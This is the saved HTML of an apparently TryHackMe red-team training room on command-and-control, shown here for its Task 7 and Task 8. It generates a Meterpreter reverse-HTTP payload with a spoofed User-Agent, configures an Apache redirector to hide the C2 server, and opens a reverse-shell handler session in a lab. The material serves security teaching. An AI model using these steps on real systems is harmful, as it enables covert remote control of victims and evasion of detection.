                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse7">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 7                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Advanced C2 Setups
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3>There's Always Room for Improvement</h3><div><span>As you may have guessed, Metasploit itself is not that great of a <a class="CbYKGe7t glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;CbYKGe7t&#39;)">C2</a> server for advanced adversary operations. It's not as flexible as one would desire; you cannot configure agents to beacon out every X seconds with Y jitter. A Next-Generation Firewall could quickly pick up on this C2 traffic, seeing it's a constant stream of traffic.&nbsp;</span><span style="font-size:1rem">In addition, anyone could connect to an HTTP/HTTPS listener and find out relatively quickly what is going on.</span></div><div><span style="font-size:1rem"><br></span></div><div><h3>Command and Control Redirectors&nbsp;</h3></div><div><span style="font-size:1rem"> </span></div><div><span style="font-size:1rem"><b>What is a Redirector?</b></span></div><div><span style="font-size:1rem">Before we dive into configuring a Redirector, first, what is it?&nbsp;</span><span style="font-size:1rem"><span>A Redirector is exactly as it sounds. It's a server that "Redirects" <a class="0HyBB8hD glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;0HyBB8hD&#39;)">HTTP</a>/HTTPS requests based on information within the HTTP Request body. In production systems, you may see a "Redirector" in the form of a Load Balancer. This server often runs Apache 2 or NGINX. For this lab, we will be leveraging Apache and some of its modules to build a Redirector.</span></span></div><div><br></div><div><span style="font-size:1rem"><span>Jumping back into Metasploit, we can set up some basic configurations on Metasploit to allow for more advanced configurations, in this task; we will be setting up a Redirector. Usually, this configuration is set up on multiple hosts; the purpose of this is to hide the true Command and Control server. The diagram below illustrates how communications between a victim and a <a class="izV5HKed glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;izV5HKed&#39;)">C2</a> server happen.</span></span></div><div><span style="font-size:1rem"><br></span></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/c38457eb8f35b56a630d1e1b9f2bc75f.png"><span style="font-size:1rem"><br></span></div><div style="text-align:center"><i><span>Illustration of a <a class="jloR0Ci7 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;jloR0Ci7&#39;)">C2</a> and Redirector with victims calling back</span></i></div><div><span style="font-size:1rem"><br></span></div><div><span>Usually, when you have a <a class="wkjLIsQX glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;wkjLIsQX&#39;)">C2</a> callback, you may set the callback host to a Domain, let's say admin.tryhackme.com. It's very common for your C2 Server to get reported, when a user files a complaint. Usually, the server gets taken down fairly quickly. It can sometimes be as little as 3 hours and as much as 24</span><span style="font-size:1rem">. Setting up a redirector ensures that any information you may have collected during the engagement is safe and sound.&nbsp;</span></div><div><span style="font-size:1rem"><br><span>But how does this stop the <a class="DHKN96GS glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;DHKN96GS&#39;)">C2</a> Server from being taken down? Surely if someone fingerprinted Cobalt Strike on your C2 Server, someone would file a complaint, and it would get taken down. This is true, so you should set up a Firewall to only allow communication to and from your redirector(s) to mitigate any potential risks.</span></span></div><div><span style="font-size:1rem"><br></span></div><div style="text-align:center"><img src="./TryHackMe _ Intro to C2_files/3ac046c94e8d8be64015641690f5e8a7.png"><span style="font-size:1rem"><br></span></div><div><div style="text-align:center"><i><span>Illustration of how a <a class="WLhMrsch glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;WLhMrsch&#39;)">C2</a> Server and a Redirector should interact</span></i></div><div style="text-align:center"><i><br></i></div><span style="font-size:1rem"><b>How is a Redirector Setup?</b></span></div><div><span style="font-size:1rem">Before we dive into configuring a redirector, we must first understand how one is set up; we will be </span>aligning<span style="font-size:1rem">&nbsp;this to the tools we have </span>available, which are&nbsp;<span style="font-size:1rem"><span>Metasploit and <a class="gUyKiaGW glossary-term" onclick="initPopOver(&#39;Apache&#39;, &#39;gUyKiaGW&#39;)">Apache</a>2. In Apache, we will be leveraging a module called "mod_rewrite" (or the Rewrite module). This module allows us to write rules to forward requests to internal or external hosts on a server based on specific HTTP headers or content. We will need to use several modules to configure our Redirector. The following modules must be enabled:</span></span></div><ul><li><span style="font-size:1rem">rewrite</span></li><li><span style="font-size:1rem">proxy</span></li><li><span style="font-size:1rem">proxy_http</span></li><li><span style="font-size:1rem">headers</span></li></ul><p><span style="font-size:1rem"><i><span>Note: If you are using the Attack Box, there is already a service running on port 80 - you must change the default port that <a class="mrhnuvSj glossary-term" onclick="initPopOver(&#39;Apache&#39;, &#39;mrhnuvSj&#39;)">Apache</a> listens on in /etc/apache2/ports.conf. You must do this before starting the Apache 2 service, or it will fail to start.</span></i></span></p><div>You can install apache 2 and enable it with the following commands:</div><div><br></div><div><span style="font-size:1rem">

<div class="terminal-container"><strong>
    <div class="terminal-content">
        <div class="terminal-top">
            Enabling Modules and Starting Apache2
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session">
<span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">apt</span> <span class="token function">install</span> apache2</span></span>
<span class="token output">Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  python-bs4 python-chardet python-dicttoxml python-dnspython python-html5lib
  python-jsonrpclib python-lxml python-mechanize python-olefile python-pypdf2
  python-slowaes python-webencodings python-xlsxwriter
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
  libaprutil1-ldap
Suggested packages:
  apache2-doc apache2-suexec-pristine | apache2-suexec-custom
The following NEW packages will be installed
  apache2 apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
  libaprutil1-ldap
0 to upgrade, 6 to newly install, 0 to remove and 416 not to upgrade.

Processing triggers for systemd (237-3ubuntu10.42) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
Processing triggers for ufw (0.36-0ubuntu0.18.04.1) ...
Processing triggers for ureadahead (0.100.0-21) ...

</span><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">a2enmod rewrite <span class="token operator">&amp;&amp;</span> a2enmod proxy <span class="token operator">&amp;&amp;</span> a2enmod proxy_http <span class="token operator">&amp;&amp;</span> a2enmod headers <span class="token operator">&amp;&amp;</span> systemctl start apache2 <span class="token operator">&amp;&amp;</span> systemctl status apache2</span></span>
<span class="token output"><span>Enabling module rewrite.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module proxy.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module proxy_http.
To activate the new configuration, you need to run:
  systemctl restart apache2
Enabling module headers.
To activate the new configuration, you need to run:
  systemctl restart apache2

● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
     Active: active (running) since Thu 2022-02-10 23:17:08 EST; 7ms ago
       Docs: https://httpd.apache.org/docs/2.4/
    Process: 4149 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
   Main PID: 4153 (apache2)
      Tasks: 1 (limit: 19072)
     Memory: 6.0M
        CPU: 19ms
     CGroup: /system.slice/apache2.service
             └─4153 /usr/sbin/apache2 -k start
</span></span></code>
        </pre>
    </div>
</strong></div>


</span></div><div><span style="font-size:1rem"><br></span></div><div><span style="font-size:1rem"><span>Using Meterpreter, we have the ability to configure various aspects of the <a class="g7MOD5op glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;g7MOD5op&#39;)">HTTP</a> Request, for example, the User-Agent. It is very common for a threat actor to make a slight adjustment to the User-Agent in their C2 HTTP/HTTPS payloads. It's in every HTTP request, and they all more or less look the same, and there is a very good chance a security analyst may overlook a modified user agent string. For this demonstration, we will generate a Meterpreter Reverse HTTP payload using MSFvenom; then we will inspect the HTTP request in Wireshark.&nbsp;</span></span></div><div><span style="font-size:1rem"><br></span></div><div><span style="font-size:1rem"><b>Generating a Payload with Modified Headers -</b></span></div>



<div></div><div><span style="font-weight:bolder;font-size:1rem"></span><br></div><div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top" style="font-weight:bold"><span>
            Generating a Modified HTTP Payload with Meterpreter        </span></div>
        <pre class="terminal-code language-shell-session" style="font-weight:bold" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/meterpreter/reverse_http <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>tun0 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">80</span> <span class="token assign-left variable">HttpUserAgent</span><span class="token operator">=</span>NotMeterpreter -f exe -o shell.exe</span></span>
<span class="token output">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 454 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
</span></code>
        </pre><p>After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use the <code><span><a class="JiXvBKXY glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;JiXvBKXY&#39;)">HTTP</a></span></code><span>&nbsp;filter to only view <a class="WS00QvAe glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;WS00QvAe&#39;)">HTTP</a> requests. After it's started capturing packets, execute the binary on the victim system. You will notice an HTTP request come in with our modified User-Agent.</span></p><p style="font-weight:bold;text-align:center"><img src="./TryHackMe _ Intro to C2_files/b842ee1430892fa04c092531b9383f4f.png" style="width:1056.11px;height:509.269px"></p><p style="text-align:center"><i><span>Packet Capture of the modified <a class="LnTA907N glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;LnTA907N&#39;)">HTTP</a> Payload with Meterpreter</span></i></p><p style="text-align:left"><span>Now that we have a field we can control in the <a class="mxKo8Yut glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;mxKo8Yut&#39;)">HTTP</a> Request, let's create an Apache2 mod_rewrite rule that filters on the user agent "NotMeterpreter" and forward it to our Metasploit C2 Server.</span></p><div class="room-task-desc" style="display:flex"><div class="room-task-desc-data" style="flex:2 1 0%;overflow:hidden"><div class="terminal-container"><div class="terminal-container"><div class="terminal-content" style="position:relative"><p><span style="font-weight:bolder"><span>Modifying the <a class="lrLPyXfa glossary-term" onclick="initPopOver(&#39;Apache&#39;, &#39;lrLPyXfa&#39;)">Apache</a> Config File -&nbsp;</span></span></p><p><span>This section may sound intimidating but is actually quite easy; we will be taking the default <a class="xPMQM8I0 glossary-term" onclick="initPopOver(&#39;Apache&#39;, &#39;xPMQM8I0&#39;)">Apache</a> config and modifying it to our advantage. On Debian based systems, the default config can be found at </span><code>/etc/apache2/sites-available/000-default.conf</code>.</p></div></div></div></div></div></div></div><div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top" style="font-weight:bold">
            Default Apache2 Config        </div>
        <pre class="terminal-code language-shell-session" style="font-weight:bold" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span>  <span class="token bash language-bash"><span class="token function">cat</span> /etc/apache2/sites-available/000-default.conf  <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token string">'#'</span></span></span>
<span class="token output">&lt;VirtualHost *:80&gt;

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        &lt;Directory&gt;
                AllowOverride All
        &lt;/Directory&gt;

</span><span class="token command"><span class="token info punctuation"><span class="token path">        ErrorLog </span></span><span class="token shell-symbol important">$</span><span class="token bash language-bash"><span class="token punctuation">{</span>APACHE_LOG_DIR<span class="token punctuation">}</span>/error.log</span></span>
<span class="token command"><span class="token info punctuation"><span class="token path">        CustomLog </span></span><span class="token shell-symbol important">$</span><span class="token bash language-bash"><span class="token punctuation">{</span>APACHE_LOG_DIR<span class="token punctuation">}</span>/access.log combined</span></span>

<span class="token output">&lt;/VirtualHost&gt;

</span></code>
        </pre><p><span>Now that we have a general idea of the <a class="KaXcwG6S glossary-term" onclick="initPopOver(&#39;Apache&#39;, &#39;KaXcwG6S&#39;)">Apache</a>2 Config file is structured, we must add a few lines to the config file to enable the Rewrite Engine, add a rewrite condition, and lastly, pass through the Apache 2 Proxy. This sounds fairly complex, but it's quite simple. </span></p><p>To enable the <a href="https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html" target="_blank">Rewrite Engine</a>, we must add&nbsp;<code>RewriteEngine On</code> onto a new line in the VirtualHost section. </p><p><span>Now we will be using a Rewrite Condition targeting the <a class="rxrhMrC4 glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;rxrhMrC4&#39;)">HTTP</a> User-Agent. For a complete list of HTTP Request Targets, see the </span><a href="https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html" target="_blank">mod_rewrite documentation</a> on Apache.org. Because we only want to match the User-Agent "NotMeterpreter", we need to use some basic Regular Expressions to capture this; adding a ^ signals the beginning of a string and a $ at the end of the series, giving us with "^NotMeterpreter$". This Regex will <b>only </b>capture the NotMeterpreter User-Agent. We can add this line&nbsp;<code>RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"</code><span> to our config to (as previously stated) only allow <a class="cFzgXYyf glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;cFzgXYyf&#39;)">HTTP</a> Requests with the NotMeterpreter user agent to access Metasploit.</span></p><p>Lastly, we must forward the request through Apache2, through our proxy, to Metasploit. To do this, we must use the ProxyPass feature of Apache's <a href="https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html" target="_blank">mod_proxy module</a><span>. To do this, we just need to specify the base <a class="FdEXQumk glossary-term" onclick="initPopOver(&#39;URI&#39;, &#39;FdEXQumk&#39;)">URI</a> that the request will be forwarded to (in our case, we just need "/"), and the target we want to forward the request to. This </span><b>will </b><span>vary from setup to set up, but this IP Address will be your <a class="D0FYRIcT glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;D0FYRIcT&#39;)">C2</a> server. In the lab scenario, it will be localhost and port that Metasploit is listening on. This will give us a full config file that looks like so:</span></p></div></div>

<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top" style="font-weight:bold">
            Modified Apache2 Config        </div>
        <pre class="terminal-code language-shell-session" style="font-weight:bold" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span>  <span class="token bash language-bash"><span class="token function">cat</span> /etc/apache2/sites-available/000-default.conf  <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token string">'#'</span></span></span>

<span class="token output">&lt;VirtualHost *:80&gt;

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	RewriteEngine On
	RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
	ProxyPass "/" "http://localhost:8080/"

	&lt;Directory&gt;
		AllowOverride All
	&lt;/Directory&gt;

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

&lt;/VirtualHost&gt;

</span></code>
        </pre><p style="font-weight:bold"><br></p><p><b>Setting Up Exploit/Multi/Handler</b></p><p><span>To set up Meterpreter properly, we need to make a few modifications; We must set our LHOST argument to the incoming interface that we are expecting connections from, in our lab; this will be 127.0.0.1. In the real world, this will be your public interface that your Redirector will be connecting to (aka your Public IP Address), and the LPORT will be whatever you like. For the lab, we will be using TCP/8080; this can be whatever you like in production. As always, the best practice is to run services over their standard protocols, so <a class="A828LPpu glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;A828LPpu&#39;)">HTTP</a> should run on port 80, and HTTPS should run on port 443. These options will also need to be duplicated for ReverseListenerBindAddress and ReverseListenerBindPort.</span></p><p><span>Next, we need to set up OverrideLHOST - This value will be your redirector's IP Address or Domain Name. After that, we need to set the OverrideLPORT; this will be the port that the <a class="T1CCeyA4 glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;T1CCeyA4&#39;)">HTTP</a> </span><i>or&nbsp;</i><span>HTTPS is running on, on your Redirector. Lastly, we must set the OverrideRequestHost to true. This will make Meterpreter respond with the OverrideHost information, so all queries go through the Redirector and not your <a class="1XOa809P glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;1XOa809P&#39;)">C2</a> server. Now that you understand what must be configured, let's dive into it:</span></p></div></div>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top" style="font-weight:bold">
            Metasploit Redirector        </div>
        <pre class="terminal-code language-shell-session" style="font-weight:bold" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">root@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfconsole</span></span>
<span class="token output"><span>msf6 &gt; use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http
payload =&gt; windows/meterpreter/reverse_http
msf6 exploit(multi/handler) &gt; set LHOST 127.0.0.1
LHOST =&gt; 127.0.0.1
msf6 exploit(multi/handler) &gt; set LPORT 8080
LPORT =&gt; 8080
msf6 exploit(multi/handler) &gt; set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress =&gt; 127.0.0.1
msf6 exploit(multi/handler) &gt; set ReverseListenerBindPort 8080
ReverseListenerBindPort =&gt; 8080
msf6 exploit(multi/handler) &gt; set OverrideLHOST 192.168.0.44
OverrideLHOST =&gt; 192.168.0.44
msf6 exploit(multi/handler) &gt; set OverrideLPORT 80
OverrideLPORT =&gt; 80
msf6 exploit(multi/handler) &gt; set HttpUserAgent NotMeterpreter
HttpUserAgent =&gt; NotMeterpreter
msf6 exploit(multi/handler) &gt; set OverrideRequestHost true
OverrideRequestHost =&gt; true
msf6 exploit(multi/handler) &gt; run
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started HTTP reverse handler on http://127.0.0.1:8080
[*] http://127.0.0.1:8080 handling request from 127.0.0.1; (UUID: zfhp2nwt) Staging x86 payload (176220 bytes) ...
[*] Meterpreter session 3 opened (127.0.0.1:8080 -&gt; 127.0.0.1 ) at 2022-02-11 02:09:24 -0500

</span></span></code>
        </pre><p>After this has all been set up, running your Meterpreter Reverse Shell should now proxy all communications through your Redirector! For awareness, the diagram below is how our Redirector is set up in our lab; as a reminder, in engagements, you will want to use <b>multiple </b><span>hosts and <a class="VGiyAzRm glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;VGiyAzRm&#39;)">DNS</a> records instead of IP Addresses.&nbsp;</span></p><p style="text-align:center">&nbsp;<img src="./TryHackMe _ Intro to C2_files/267a18249f3b9f9ad07e0b9e429bd942.png"></p><p style="text-align:center"><i>Lab Redirector Setup</i></p></div></div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What setting name that allows you to modify the User Agent field in a Meterpreter payload?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *************" value="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>What setting name that allows you to modify the Host header in a Meterpreter payload?</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: **************" value="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Submit
                        </button>
                        </div>
                        <div class="room-task-input-hint">
                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
                        <i class="fal fa-lightbulb"></i> Hint
                      </button>
                        </div>
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-8">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse8">
                        <a class="card-link">
                            <span class="task-dropdown-title red">Task 8                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Wrapping Up 
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse8" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-incomplete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3>Recap</h3><div><span>In this room, you hopefully learned a lot about Command and Control frameworks and will be able to take the knowledge you gained within this room and apply it in the real world. At the end of the day, almost everyone in Red Team Ops uses a Command and Control Framework. It's an essential part of every Red Teamer's toolkit, and we encourage you to go out and explore various <a class="vO326E44 glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;vO326E44&#39;)">C2</a> frameworks that were not covered or mentioned in this room.</span></div><div><br></div><div><h3><span>How to Choose a <a class="T5D1H02e glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;T5D1H02e&#39;)">C2</a> Framework</span></h3></div><div><span>After finishing this room, you may be left with some questions, and hopefully, one of them is "How do I know what <a class="oGFbROLF glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;oGFbROLF&#39;)">C2</a> Framework to choose in my Red Team Operations". There is no right or wrong answer for this, just a few general questions that you should answer first:</span></div><ul><li>What are your goals?&nbsp;</li><li>Do you have a budget?</li><li>Do you need something highly customizable?</li><li><span>Is off-the-shelf <a class="MizAexeO glossary-term" onclick="initPopOver(&#39;AV&#39;, &#39;MizAexeO&#39;)">AV</a> Evasion necessary?</span></li><li>Do you need the ability to create your own modules/scripts?</li><li>Is built-in reporting necessary for you?</li></ul><p>You should then take that information to the <a href="https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0" target="_blank">C2 Matrix spreadsheet</a><span>&nbsp;and narrow your selection based on the questions above. If you find a Premium <a class="OE7qWs6m glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;OE7qWs6m&#39;)">C2</a> Framework that meets your criteria, it is </span><b>highly </b><span>recommended&nbsp;you request an evaluation/trial to find out if that <a class="mj70t55Q glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;mj70t55Q&#39;)">C2</a> Framework works best for you.</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Read the closing task.
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="8">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
                            <i class="far fa-paper-plane"></i> Completed
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Intro to C2_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Intro to C2_files/8110073ead81bd5ce12c5a956b18af06.jpg"> 
        <a class="green-link" href="https://tryhackme.com/p/l000g1c">l000g1c</a></p><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 20369 users are in here and this room is 496 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox">
<div id="room-attackbox">
<div id="attackbox-machine-instance">
<div id="room-attackbox-loading"></div>
<div id="room-attackbox-vm-view"></div>
</div>
<div id="attackbox-machine-options">
<div class="d-flex">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen"></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
<div class="d-flex" id="room-attackbox-tabs"></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires"></div>
</div>
</div>
<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-light-gray">
<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
</div>
<div class="modal-body">
<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4">
<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"></code></li>
<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14"></code> <span class="size-14">(Use this for your reverse shells)</span></li>
<li class="mt-1">Username: <code id="browser-username" class="dark size-14"></code></li>
<li class="mt-1">Password: <code id="browser-password" class="dark size-14"></code></li>
<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14"></code></li>
</ul>
<hr class="hr-min">
<ul class="text-lgray mb-0">
<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Intro to C2_files/clipboard.gif"></details></li>
<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div id="award-modal-badges"></div>
<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body"></div>
</div>
</div>
</div>
<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">...</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center"></div>
<div class="modal-footer"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Intro to C2_files/modal.css">
<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content" id="roomCompletedModalContent">
<div class="modal-body text-center">
<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
<i class="fad fa-times-circle"></i>
</button>
<div class="icon-box">
<i class="fad fa-badge-check"></i>
</div>
<h3 class="text-accent mt-5">Congratulations</h3>
<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share"></h2>
<div id="ticket-info"></div> 
<p class="faded mt-1" id="roomFeedbackBtn">
<small>
<button class="bg-white border-0">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
<input type="hidden" name="_csrf" value="t0vGoCRN-EM_eP27eP8-VjxlOIjr2nt8fPKw">
<input type="hidden" name="roomCode" value="introtoc2">
<input type="hidden" name="type" value="rooms">
<input type="hidden" name="redirect" value="json">
<div class="form-group">
<label class="mb-0" for="like">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="dislike">What don't you like about the room?</label>
